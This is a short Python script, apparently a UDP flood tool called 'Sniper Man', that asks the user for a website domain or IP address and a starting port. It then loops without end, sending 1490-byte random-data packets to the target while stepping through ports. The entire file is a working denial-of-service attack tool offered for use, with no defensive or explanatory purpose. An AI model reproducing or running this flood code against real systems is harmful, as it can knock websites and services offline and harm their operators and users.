from platform import system
from tqdm.auto import tqdm
import os
import time
import random
import socket
import pyfiglet
#platform info
uname=system()
if uname=="Windows":
	cmd='cls'
else :
	cmd='clear'
os.system(cmd)
##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############
while True:
	print("\033[35;1m")
	print(pyfiglet.figlet_format("Sniper     Man",font='larry3d'),'\033[0m')
	print("  \033[91;1m                      Author : Bot-Codder")
	print("    		        Github  : https://github.com/BOT-CODER")
	print('                        Please contact us in github Page')
	print("\033[0m","\033[92;1m")
	print("1. Website Domain\n2. IP Addresse\n3. Exit")
	opt=str(input("\nEnter Your choice: "))
	if opt=='1':
		domain=str(input("Enter The Website (eg:google.com):"))
		ip=socket.gethostbyname(domain)
		break
	elif opt=='2':
		ip = input("IP Addresse  : ")
		break
	elif opt=='3':
		print('\033[0m')
		exit()
	else:
		print('\033[91mInvaild Choice!\033[0m')
		time.sleep(2)
		os.system(cmd)
port =int(input("Port Number  : "))
os.system(cmd)
print('\033[36;2mINITIALIZING....')
for i in tqdm(range(10000)):
	print(end='\r')
time.sleep(4)
print('STARTING...')
time.sleep(4)
sent = 0
try:
	while True:
		sock.sendto(bytes, (ip,port))
		sent=sent+1
		port=port+1
		print("\033[32;1mSent %s packet to %s throught port:%s"%(sent,ip,port))
		if port==65534:
			port=1
		elif port==1900:
			port=1901
except:
	print('\n\033[31;1mExited\nThank u for using my program \033[0m')
